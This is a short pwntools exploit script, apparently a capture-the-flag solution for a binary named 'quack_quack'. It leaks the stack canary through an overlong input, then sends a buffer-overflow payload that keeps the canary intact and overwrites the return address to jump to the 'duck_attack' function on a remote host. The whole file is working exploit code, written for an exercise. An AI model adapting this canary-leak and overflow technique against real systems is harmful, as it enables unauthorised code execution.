#!/usr/bin/env python3

from pwn import *
import struct
exe = ELF("./quack_quack_patched")

context.binary = exe
gdb_script = '''
b *duckling+335
b *duckling+319
b *duckling+270
c
'''


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("94.237.51.67", 40153)

    return r


def main():
    r = conn()

    flag = exe.sym.duck_attack
    offset = 88
    canary_offset = 89
    
    padding = b"A"*canary_offset + b"Quack Quack "
    r.sendline(padding)
    
    r.recvuntil(b"Quack Quack ")
    r.recvline()
    
    canary_leak = r.recvuntil(b", ready to fight the Duck?")
    canary = canary_leak[33:40][::-1].ljust(8, b'\x00')
    canary = struct.unpack(">Q", canary)[0]
    
    log.info(f"Stack Canary Leaked: {hex(canary)}")
    
    payload = b"A"*offset + p64(canary) + b"A"*8 + p64(flag)
    r.sendline(payload)
    
    r.interactive()        



if __name__ == "__main__":
    main()
